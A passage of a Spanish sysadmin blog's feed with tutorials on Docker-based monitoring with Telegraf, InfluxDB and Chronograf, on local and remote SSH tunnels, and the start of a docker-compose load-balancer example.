&lt;/pre&gt;&lt;/div&gt;</content><category term="ssh"></category><category term="túnel"></category><category term="systemd"></category></entry><entry><title>Visualizando gráficamente el estado de nuestro servidor con Telegraf, InfluxDB y Chronograf</title><link href="https://www.linuxsysadmin.ml/2016/11/visualizando-graficamente-el-estado-de-nuestro-servidor-con-telegraf-influxdb-y-chronograf.html" rel="alternate"></link><published>2016-11-07T08:00:00+01:00</published><updated>2016-11-07T08:00:00+01:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2016-11-07:/2016/11/visualizando-graficamente-el-estado-de-nuestro-servidor-con-telegraf-influxdb-y-chronograf.html</id><summary type="html">&lt;p&gt;No hay nada mas visualmente atractivo que ver nuestros servidores en tiempo real mediante gráficos temporales, y existen algunas buenas herramientas ya hechas. Necesitaremos un agente que recolecte los datos del servidor y los envíe a una base de datos temporales, para que se pueden dibujar en una página web …&lt;/p&gt;</summary><content type="html">&lt;p&gt;No hay nada mas visualmente atractivo que ver nuestros servidores en tiempo real mediante gráficos temporales, y existen algunas buenas herramientas ya hechas. Necesitaremos un agente que recolecte los datos del servidor y los envíe a una base de datos temporales, para que se pueden dibujar en una página web.&lt;/p&gt;
&lt;p&gt;Estamos hablando del combo &lt;strong&gt;Telegraf&lt;/strong&gt;, &lt;strong&gt;InfluxDB&lt;/strong&gt; y &lt;strong&gt;Chronograf&lt;/strong&gt;, que para ponernos la vida mas fácil, se pueden levantar como contenedores &lt;strong&gt;Docker&lt;/strong&gt;.&lt;/p&gt;
&lt;h2&gt;Servicios necesarios&lt;/h2&gt;
&lt;h3&gt;La base de datos temporal&lt;/h3&gt;
&lt;p&gt;Una base de datos temporal especialmente diseñada para este trabajo se llama &lt;strong&gt;InfluxDB&lt;/strong&gt;. Solo neceitamos levantar un contenedor en el almacenar nuestras series de datos. Para ello, no tenemos mas que levantar nuestro contenedor, de entre la imágenes oficiales.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sodium:~/docker$ docker run -d influxdb
9ee87def20cda02c273acb6ae4dbd15a2473a1d93821533ea92e375a0ef54313
gerard@sodium:~/docker$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;El recolector de datos&lt;/h3&gt;
&lt;p&gt;El proceso encargado de recoger los datos de un servidor es &lt;strong&gt;Telegraf&lt;/strong&gt;. En principio, necesitamos uno en cada servidor que queramos monitorizar. Para no alargar en el artículo, lo vamos a levantar en la misma máquina.&lt;/p&gt;
&lt;p&gt;Hay que empezar generando una configuración, que vamos a cambiar para ajustar a nuestras necesidades. Esta configuración se encarga de decidir que muestras se van a tomar de nuestro servidor, y sirve también para indicar la localización de la base de datos en donde las va a guardar.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sodium:~/docker$ docker run --rm telegraf -sample-config &amp;gt; telegraf.conf
gerard@sodium:~/docker$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;En este caso, vamos a cambiar solamente la dirección de la base de datos:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sodium:~/docker$ cat telegraf.conf 
...
&lt;span class="o"&gt;[[&lt;/span&gt;outputs.influxdb&lt;span class="o"&gt;]]&lt;/span&gt;
...
  &lt;span class="nv"&gt;urls&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;http://172.17.0.2:8086&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="c1"&gt;# required&lt;/span&gt;
...
gerard@sodium:~/docker$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ahora hay que levantar el agente con la nueva configuración. Podemos hacerlo con una imagen modificada, o si eso no nos gusta, podemos utilizar un contenedor a la máquina local. Haremos esto último.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sodium:~/docker$ docker run -v &lt;span class="nv"&gt;$PWD&lt;/span&gt;/telegraf.conf:/etc/telegraf/telegraf.conf:ro -d telegraf
e5cbaed75570d22c709c940a7d5ccf4a633fc2453df37e05dfa094ae4913572a
gerard@sodium:~/docker$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;El panel web&lt;/h3&gt;
&lt;p&gt;Hay muchas herramientas para visualizar datos, pero nos vamos a limitar a la herramienta de la misma &lt;em&gt;suite&lt;/em&gt;, que es &lt;strong&gt;Chronograf&lt;/strong&gt;. Para eso tenemos que levantar su contenedor. Es especialmente importante exponer el puerto, para poder ver la web desde fuera del contenedor.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sodium:~/docker$ docker run -p &lt;span class="m"&gt;10000&lt;/span&gt;:10000 -d chronograf
b3fb6777bac2ad5c061ff5ea6603305c0c43d6103c552a47fafb1414a7434c34
gerard@sodium:~/docker$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Solo nos faltaría abrir un navegador a la URL configurada, que en mi caso es &lt;a href="http://localhost:10000/"&gt;http://localhost:10000/&lt;/a&gt;. Es un buen momento para configurar nuestra base de datos. Aunque se pueden usar varias, no lo haremos por hoy.&lt;/p&gt;
&lt;p&gt;Le damos al botón "Add new server" y le indicamos los valores de acceso al servidor &lt;strong&gt;InfluxDB&lt;/strong&gt;. En mi caso, solo he tenido que tocar la dirección IP, que al tratarse del primer contenedor levantado, es la 172.17.0.2; mirad la salida de un &lt;em&gt;docker inspect&lt;/em&gt; en caso de dudas.&lt;/p&gt;
&lt;h2&gt;Configurando visualizaciones y dashboards&lt;/h2&gt;
&lt;p&gt;Una visualización es un gráfico basado en una serie de valores de una serie. Un &lt;em&gt;dashboard&lt;/em&gt; es un conjunto de visualizaciones puestas en la misma pantalla, para su fácil observación.&lt;/p&gt;
&lt;p&gt;Podemos crear visualizaciones mediante el botón "Add Visualization" desde la sección "Visualizations" o desde un &lt;em&gt;dashboard&lt;/em&gt;. La configuración es trivial; basta con darle un nombre al gráfico y seleccionar base de datos, medidas y el valor o valores de la medida que queremos ver.&lt;/p&gt;
&lt;p&gt;Por ejemplo, podemos crear el gráfico "Memory". Seleccionamos la base de datos &lt;em&gt;telegraf&lt;/em&gt;, la serie &lt;em&gt;mem&lt;/em&gt; en "Filter by" y el campo &lt;em&gt;used_percent&lt;/em&gt; en "Extract by". La consulta resultante a &lt;strong&gt;InfluxDB&lt;/strong&gt; quedaría así:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;SELECT used_percent FROM telegraf..mem WHERE tmpltime()&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Insuficiente con este valor, creamos un &lt;em&gt;dashboard&lt;/em&gt; llamado "Server". Le añadimos la visualización ya existente llamada "Memory" y porque no, creamos una visualización nueva "CPU" con dos valores en el campo "Extract by". Así de fácil.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Chronograf dashboard" src="https://www.linuxsysadmin.ml/images/chronograf.jpg"&gt;&lt;/p&gt;
&lt;p&gt;Y con eso acabamos. Solo falta poner esto en un sitio visible y sacar nuestras conclusiones.&lt;/p&gt;</content><category term="chronograf"></category><category term="telegraf"></category><category term="influxdb"></category><category term="docker"></category></entry><entry><title>Creando túneles con SSH</title><link href="https://www.linuxsysadmin.ml/2016/10/creando-tuneles-con-ssh.html" rel="alternate"></link><published>2016-10-31T08:00:00+01:00</published><updated>2016-10-31T08:00:00+01:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2016-10-31:/2016/10/creando-tuneles-con-ssh.html</id><summary type="html">&lt;p&gt;Todos conocemos las bondades de &lt;strong&gt;SSH&lt;/strong&gt; cuando se trata de acceder a un servidor remoto con una sesión interactiva. Sin embargo, pocos conocen otra habilidad que este servicio nos ofrece: encapsular tráfico de cualquier protocolo a través de un túnel &lt;strong&gt;SSH&lt;/strong&gt;, cifrando nuestro tráfico y pasando potencialmente por otro puerto …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Todos conocemos las bondades de &lt;strong&gt;SSH&lt;/strong&gt; cuando se trata de acceder a un servidor remoto con una sesión interactiva. Sin embargo, pocos conocen otra habilidad que este servicio nos ofrece: encapsular tráfico de cualquier protocolo a través de un túnel &lt;strong&gt;SSH&lt;/strong&gt;, cifrando nuestro tráfico y pasando potencialmente por otro puerto.&lt;/p&gt;
&lt;p&gt;La idea es que &lt;strong&gt;SSH&lt;/strong&gt; encapsula el tráfico mediante el mismo protocolo &lt;strong&gt;SSH&lt;/strong&gt;, evitando que curiosos accedan a nuestros datos, y pasando por el puerto &lt;strong&gt;SSH&lt;/strong&gt; para llegar a puertos a los que normalmente no llegaríamos, sea porque no están visibles, o sea porque un &lt;em&gt;firewall&lt;/em&gt; bloquea el resto de tráfico.&lt;/p&gt;
&lt;p&gt;Estos túneles pueden ser de dos tipos: locales o remotos; la única diferencia es donde están los extremos, desde el punto de vista del que creó el túnel. En el caso de los túneles remotos, el puerto expuesto es local a la máquina que lanza el comando &lt;em&gt;ssh&lt;/em&gt; y conecta en el otro extremo con una máquina remota. En el caso de un túnel remoto, el puerto en escucha se sitúa en la máquina remota y conecta con un puerto local.&lt;/p&gt;
&lt;h2&gt;Un ejemplo de túnel local&lt;/h2&gt;
&lt;p&gt;Vamos a suponer que tenemos una máquina que tiene instalado un servicio que no es accesible desde la red, por ejemplo, una base de datos &lt;strong&gt;mongodb&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@dbserver:~# netstat -lntp
Active Internet connections &lt;span class="o"&gt;(&lt;/span&gt;only servers&lt;span class="o"&gt;)&lt;/span&gt;
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        &lt;span class="m"&gt;0&lt;/span&gt;      &lt;span class="m"&gt;0&lt;/span&gt; &lt;span class="m"&gt;127&lt;/span&gt;.0.0.1:27017         &lt;span class="m"&gt;0&lt;/span&gt;.0.0.0:*               LISTEN      &lt;span class="m"&gt;3194&lt;/span&gt;/mongod     
tcp        &lt;span class="m"&gt;0&lt;/span&gt;      &lt;span class="m"&gt;0&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;.0.0.0:22              &lt;span class="m"&gt;0&lt;/span&gt;.0.0.0:*               LISTEN      &lt;span class="m"&gt;1&lt;/span&gt;/sshd          
tcp6       &lt;span class="m"&gt;0&lt;/span&gt;      &lt;span class="m"&gt;0&lt;/span&gt; :::22                   :::*                    LISTEN      &lt;span class="m"&gt;1&lt;/span&gt;/sshd          
root@dbserver:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Queremos acceder desde nuestra máquina a esa base de datos, usando un cliente local. Como la máquina remota no ofrece el puerto remotamente, pero si dispone de &lt;strong&gt;SSH&lt;/strong&gt;, vamos a crear un túnel local.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~$ ssh -L &lt;span class="m"&gt;27272&lt;/span&gt;:localhost:27017 user@dbserver -N
user@dbserver&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;s password: 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;La idea es que estamos indicando que en la máquina local va a haber un puerto 27272 que va a conectar con &lt;em&gt;localhost:27017&lt;/em&gt;, &lt;strong&gt;desde el punto de vista de la máquina remota&lt;/strong&gt;. El &lt;em&gt;flag&lt;/em&gt; -L significa que el puerto es local, y el &lt;em&gt;flag&lt;/em&gt; -N indica que la sesión &lt;strong&gt;SSH&lt;/strong&gt; no va a ejecutar ningún comando, ni sesión interactiva.&lt;/p&gt;
&lt;p&gt;Otro &lt;em&gt;flag&lt;/em&gt; interesante es el -f, que crearía el túnel en &lt;em&gt;background&lt;/em&gt;, sin bloquear el terminal. Eso significa que no nos pueden pedir la &lt;em&gt;password&lt;/em&gt; del usuario y la autenticación tendría que ser por &lt;a href="https://www.linuxsysadmin.ml/2016/05/autenticacion-ssh-por-claves.html"&gt;claves SSH&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Solo nos falta conectar con el cliente en el puerto 27272. Esto va a causar que el tráfico se encapsule de acuerdo con el protocolo &lt;strong&gt;SSH&lt;/strong&gt; y pase por el puerto 22. Una vez en destino, se va a deshacer el encapsulado y se va a entregar el mensaje a &lt;em&gt;localhost:27017&lt;/em&gt; que, por supuesto, es el servidor de &lt;strong&gt;mongodb&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~$ mongo --port &lt;span class="m"&gt;27272&lt;/span&gt;
MongoDB shell version: &lt;span class="m"&gt;3&lt;/span&gt;.2.9
connecting to: &lt;span class="m"&gt;127&lt;/span&gt;.0.0.1:27272/test
Server has startup warnings: 
&lt;span class="m"&gt;2016&lt;/span&gt;-09-02T07:22:02.640+0000 I CONTROL  &lt;span class="o"&gt;[&lt;/span&gt;initandlisten&lt;span class="o"&gt;]&lt;/span&gt; ** WARNING: You are running this process as the root user, which is not recommended.
&lt;span class="m"&gt;2016&lt;/span&gt;-09-02T07:22:02.640+0000 I CONTROL  &lt;span class="o"&gt;[&lt;/span&gt;initandlisten&lt;span class="o"&gt;]&lt;/span&gt; 
&lt;span class="m"&gt;2016&lt;/span&gt;-09-02T07:22:02.640+0000 I CONTROL  &lt;span class="o"&gt;[&lt;/span&gt;initandlisten&lt;span class="o"&gt;]&lt;/span&gt; 
&lt;span class="m"&gt;2016&lt;/span&gt;-09-02T07:22:02.640+0000 I CONTROL  &lt;span class="o"&gt;[&lt;/span&gt;initandlisten&lt;span class="o"&gt;]&lt;/span&gt; ** WARNING: /sys/kernel/mm/transparent_hugepage/defrag is &lt;span class="s1"&gt;&amp;#39;always&amp;#39;&lt;/span&gt;.
&lt;span class="m"&gt;2016&lt;/span&gt;-09-02T07:22:02.640+0000 I CONTROL  &lt;span class="o"&gt;[&lt;/span&gt;initandlisten&lt;span class="o"&gt;]&lt;/span&gt; **        We suggest setting it to &lt;span class="s1"&gt;&amp;#39;never&amp;#39;&lt;/span&gt;
&lt;span class="m"&gt;2016&lt;/span&gt;-09-02T07:22:02.640+0000 I CONTROL  &lt;span class="o"&gt;[&lt;/span&gt;initandlisten&lt;span class="o"&gt;]&lt;/span&gt; 
&amp;gt; db
&lt;span class="nb"&gt;test&lt;/span&gt;
&amp;gt; show dbs
&lt;span class="nb"&gt;local&lt;/span&gt;  &lt;span class="m"&gt;0&lt;/span&gt;.000GB
&amp;gt; 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Por defecto, en la máquina local se utiliza &lt;em&gt;localhost&lt;/em&gt; para hacer el &lt;em&gt;bind&lt;/em&gt; del &lt;em&gt;socket&lt;/em&gt;, con lo que solamente nuestra máquina vería ese puerto abierto. Para ofrecer este puerto en todas las interfaces, basta con indicarlo:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~$ ssh -L &lt;span class="m"&gt;0&lt;/span&gt;.0.0.0:27272:localhost:27017 user@dbserver -N
user@dbserver&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;s password: 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Otro detalle importante es que el destino &lt;em&gt;localhost:27017&lt;/em&gt; es visto del punto de vista del servidor remoto. Aunque en este caso, lo hemos conectado a un puerto local del servidor remoto, nada nos impediría poner otro servidor, en vez de &lt;em&gt;localhost&lt;/em&gt;, siempre y cuando el servidor remoto pudiera acceder a ese servidor y puerto.&lt;/p&gt;
&lt;p&gt;Como punto final, indico que puse el &lt;em&gt;flag&lt;/em&gt; -N porque no me interesa abrir una sesión interactiva en el servidor destino, que es el comportamiento por defecto. Sin embargo, indicando un comando distinto se podría haber conseguido ejecutar de paso otro comando en el servidor destino. Esto nos puede venir bien para ir creando túneles en la misma línea de comandos.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;ssh -L &lt;span class="m"&gt;1234&lt;/span&gt;:localhost:1111 user1@server1 &lt;span class="se"&gt;\&lt;/span&gt;
ssh -L &lt;span class="m"&gt;1111&lt;/span&gt;:localhost:2222 user2@server2 &lt;span class="se"&gt;\&lt;/span&gt;
ssh -L &lt;span class="m"&gt;2222&lt;/span&gt;:localhost:3333 user3@server3 -N
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;En este caso, el puerto local 1234 conecta con &lt;em&gt;localhost(server1):1111&lt;/em&gt; y en &lt;em&gt;server1&lt;/em&gt; ejecuta el resto del comando. Es segundo &lt;em&gt;ssh&lt;/em&gt; crearía un puerto 1111 local (en &lt;em&gt;server1&lt;/em&gt;) que conecta con &lt;em&gt;localhost(server2):2222&lt;/em&gt; y ejecuta el tercer &lt;em&gt;ssh&lt;/em&gt; en el mismo, que crea un nuevo túnel que conecta el puerto 2222 de &lt;em&gt;server2&lt;/em&gt; al 3333 en &lt;em&gt;server3&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Entonces el usuario inicial se conecta a su local en el puerto 1234. Lo que envíe por ese &lt;em&gt;socket&lt;/em&gt; va a aparecer en &lt;em&gt;server1:1111&lt;/em&gt;, que lo entregará al otro túnel, y este al tercero. Esto significa que lo que hemos enviado por el &lt;em&gt;socket&lt;/em&gt; va a ir a parar a &lt;em&gt;server3:3333&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;Un ejemplo de túnel remoto&lt;/h2&gt;
&lt;p&gt;Imaginemos que tenemos un servicio en una máquina que no es visible desde internet, y que tenemos un proyecto en desarrollo que queremos hacer accesible. La idea es que vamos a crear túnel remoto, de forma que un puerto en una máquina remota conecte con un puerto en nuestra máquina local.&lt;/p&gt;
&lt;p&gt;Para simplificar, vamos a exponer una web simple, por ejemplo, con &lt;strong&gt;nginx&lt;/strong&gt;. Podemos fijarnos que el puerto escucha solamente en &lt;em&gt;localhost&lt;/em&gt;, aunque podría ser tráfico cortado por un &lt;em&gt;firewall&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@webserver:~# netstat -lntp
Active Internet connections &lt;span class="o"&gt;(&lt;/span&gt;only servers&lt;span class="o"&gt;)&lt;/span&gt;
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        &lt;span class="m"&gt;0&lt;/span&gt;      &lt;span class="m"&gt;0&lt;/span&gt; &lt;span class="m"&gt;127&lt;/span&gt;.0.0.1:80            &lt;span class="m"&gt;0&lt;/span&gt;.0.0.0:*               LISTEN      &lt;span class="m"&gt;3169&lt;/span&gt;/nginx: master 
root@webserver:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Disponemos de un servidor accesible de forma pública por internet, que es el que va a exponer el puerto web. Creamos el túnel remoto de forma simple.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@webserver:~# ssh -R &lt;span class="m"&gt;0&lt;/span&gt;.0.0.0:8888:localhost:80 user@publicserver -N
user@publicserver&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;s password: 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;En este caso, vamos a crear un &lt;em&gt;bind&lt;/em&gt; en &lt;em&gt;publicserver&lt;/em&gt;, de forma que va a escuchar en &lt;em&gt;0.0.0.0:8888&lt;/em&gt; y esto va a llevar a el puerto 80 de &lt;em&gt;webserver&lt;/em&gt;. Es el mismo caso que antes, pero en este caso, el origen del túnel esta en el servidor remoto, desde el punto de vista del que lanza el comando &lt;em&gt;ssh&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Otro detalle importante es que hemos declarado que el puerto origen del túnel escuche en todas las direcciones IP, ya que queremos que cualquier persona en internet lo pueda ver.&lt;/p&gt;
&lt;p&gt;Como detalle extra, &lt;strong&gt;SSH&lt;/strong&gt; no permite el &lt;em&gt;bind&lt;/em&gt; en &lt;em&gt;0.0.0.0&lt;/em&gt; por defecto, y para que lo permita, el demonio &lt;strong&gt;SSH&lt;/strong&gt; deber ser configurado con la directiva &lt;em&gt;GatewayPorts&lt;/em&gt;, que ponemos previamente al reinicio del servicio.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@publicserver:~# grep -i gatewayports /etc/ssh/sshd_config 
GatewayPorts yes
root@publicserver:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y podemos ver como el servidor &lt;em&gt;publicserver&lt;/em&gt; ha expuesto correctamente el puerto en todas las interfaces.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@publicserver:~# netstat -lntp
Active Internet connections &lt;span class="o"&gt;(&lt;/span&gt;only servers&lt;span class="o"&gt;)&lt;/span&gt;
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        &lt;span class="m"&gt;0&lt;/span&gt;      &lt;span class="m"&gt;0&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;.0.0.0:8888            &lt;span class="m"&gt;0&lt;/span&gt;.0.0.0:*               LISTEN      &lt;span class="m"&gt;13&lt;/span&gt;/sshd: root   
tcp        &lt;span class="m"&gt;0&lt;/span&gt;      &lt;span class="m"&gt;0&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;.0.0.0:22              &lt;span class="m"&gt;0&lt;/span&gt;.0.0.0:*               LISTEN      &lt;span class="m"&gt;1&lt;/span&gt;/sshd          
tcp6       &lt;span class="m"&gt;0&lt;/span&gt;      &lt;span class="m"&gt;0&lt;/span&gt; :::8888                 :::*                    LISTEN      &lt;span class="m"&gt;13&lt;/span&gt;/sshd: root   
tcp6       &lt;span class="m"&gt;0&lt;/span&gt;      &lt;span class="m"&gt;0&lt;/span&gt; :::22                   :::*                    LISTEN      &lt;span class="m"&gt;1&lt;/span&gt;/sshd          
root@publicserver:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ahora ya podemos acceder a nuestra web desde cualquier punto conectado a internet, solo que lo haremos en el puerto abierto en el servidor público. El túnel se encarga de entregarlo al servidor no visible en internet.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~$ curl http://172.17.0.2:8888/
&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;
&amp;lt;title&amp;gt;Welcome to nginx on Debian!&amp;lt;/title&amp;gt;
&amp;lt;style&amp;gt;
    body &lt;span class="o"&gt;{&lt;/span&gt;
        width: 35em&lt;span class="p"&gt;;&lt;/span&gt;
        margin: &lt;span class="m"&gt;0&lt;/span&gt; auto&lt;span class="p"&gt;;&lt;/span&gt;
        font-family: Tahoma, Verdana, Arial, sans-serif&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="o"&gt;}&lt;/span&gt;
&amp;lt;/style&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
&amp;lt;h1&amp;gt;Welcome to nginx on Debian!&amp;lt;/h1&amp;gt;
&amp;lt;p&amp;gt;If you see this page, the nginx web server is successfully installed and
working on Debian. Further configuration is required.&amp;lt;/p&amp;gt;

&amp;lt;p&amp;gt;For online documentation and support please refer to
&amp;lt;a &lt;span class="nv"&gt;href&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;http://nginx.org/&amp;quot;&lt;/span&gt;&amp;gt;nginx.org&amp;lt;/a&amp;gt;&amp;lt;/p&amp;gt;

&amp;lt;p&amp;gt;
      Please use the &amp;lt;tt&amp;gt;reportbug&amp;lt;/tt&amp;gt; tool to report bugs in the
      nginx package with Debian. However, check &amp;lt;a
      &lt;span class="nv"&gt;href&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;http://bugs.debian.org/cgi-bin/pkgreport.cgi?ordering=normal;archive=0;src=nginx;repeatmerged=0&amp;quot;&lt;/span&gt;&amp;gt;existing
      bug reports&amp;lt;/a&amp;gt; before reporting a new bug.
&amp;lt;/p&amp;gt;

&amp;lt;p&amp;gt;&amp;lt;em&amp;gt;Thank you &lt;span class="k"&gt;for&lt;/span&gt; using debian and nginx.&amp;lt;/em&amp;gt;&amp;lt;/p&amp;gt;


&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
gerard@sirius:~$ 
&lt;/pre&gt;&lt;/div&gt;</content><category term="ssh"></category><category term="túnel"></category></entry><entry><title>Microservicios con docker-compose</title><link href="https://www.linuxsysadmin.ml/2016/10/microservicios-con-docker-compose.html" rel="alternate"></link><published>2016-10-24T08:00:00+02:00</published><updated>2016-10-24T08:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2016-10-24:/2016/10/microservicios-con-docker-compose.html</id><summary type="html">&lt;p&gt;&lt;strong&gt;Docker&lt;/strong&gt; es una gran herramienta para levantar contenedores aislados, pero en el mundo real nos encontramos con despliegues mas complejos, que requieren varias imágenes trabajando en conjunto. En este caso, levantar los contenedores puede ser una auténtica pesadilla. Para automatizar estos casos podemos utilizar un &lt;em&gt;orquestador&lt;/em&gt;, como por ejemplo, &lt;strong&gt;docker-compose …&lt;/strong&gt;&lt;/p&gt;</summary><content type="html">&lt;p&gt;&lt;strong&gt;Docker&lt;/strong&gt; es una gran herramienta para levantar contenedores aislados, pero en el mundo real nos encontramos con despliegues mas complejos, que requieren varias imágenes trabajando en conjunto. En este caso, levantar los contenedores puede ser una auténtica pesadilla. Para automatizar estos casos podemos utilizar un &lt;em&gt;orquestador&lt;/em&gt;, como por ejemplo, &lt;strong&gt;docker-compose&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Para entender como funciona nos vamos a servir de un microservicio básico, que consiste en un &lt;em&gt;balanceador&lt;/em&gt; público y varios &lt;em&gt;frontends&lt;/em&gt;, que en este caso van a ser mínimos para no complicar innecesariamente este artículo.&lt;/p&gt;
&lt;p&gt;Estos &lt;em&gt;frontends&lt;/em&gt; van a responder a las peticiones con su &lt;em&gt;hostname&lt;/em&gt;, solo para ver que el balanceador hace lo que debe. En un caso mas cercano a la realidad, las aplicaciones harían algo mas útil, posiblemente utilizando una base de datos.&lt;/p&gt;
&lt;h2&gt;El balanceador&lt;/h2&gt;
&lt;p&gt;Esta imagen se declara con un &lt;em&gt;Dockerfile&lt;/em&gt; y sus ficheros auxiliares. Aunque en este caso se ha copiado un &lt;a href="https://www.linuxsysadmin.ml/2016/09/imagenes-docker-reusables-mediante-configuraciones-dinamicas.html"&gt;artículo anterior&lt;/a&gt;, se vuelven a exponer los ficheros por comodidad.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/docker/composetest$ cat balancer/Dockerfile 
FROM alpine:3.4
RUN apk add --no-cache nginx &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    ln -s /dev/stdout /var/log/nginx/access.log &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    ln -s /dev/stderr /var/log/nginx/error.log &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    mkdir /run/nginx
COPY nginx.conf /etc/nginx/
COPY config.sh entrypoint.sh /
ENTRYPOINT &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/entrypoint.sh&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
gerard@sirius:~/docker/composetest$ cat balancer/nginx.conf 
worker_processes  &lt;span class="m"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
events &lt;span class="o"&gt;{&lt;/span&gt;
    worker_connections  &lt;span class="m"&gt;1024&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
http &lt;span class="o"&gt;{&lt;/span&gt;
    include mime.types&lt;span class="p"&gt;;&lt;/span&gt;
    default_type application/octet-stream&lt;span class="p"&gt;;&lt;/span&gt;
    sendfile on&lt;span class="p"&gt;;&lt;/span&gt;
    keepalive_timeout &lt;span class="m"&gt;65&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    include conf.d/*&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
gerard@sirius:~/docker/composetest$ cat balancer/config.sh 
&lt;span class="c1"&gt;#!/bin/sh&lt;/span&gt;

&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;upstream backend {&amp;quot;&lt;/span&gt;
&lt;span class="k"&gt;for&lt;/span&gt; BACKEND in &lt;span class="k"&gt;$(&lt;/span&gt;&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;BACKENDS&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; sed &lt;span class="s1"&gt;&amp;#39;s/,/ /g&amp;#39;&lt;/span&gt;&lt;span class="k"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;
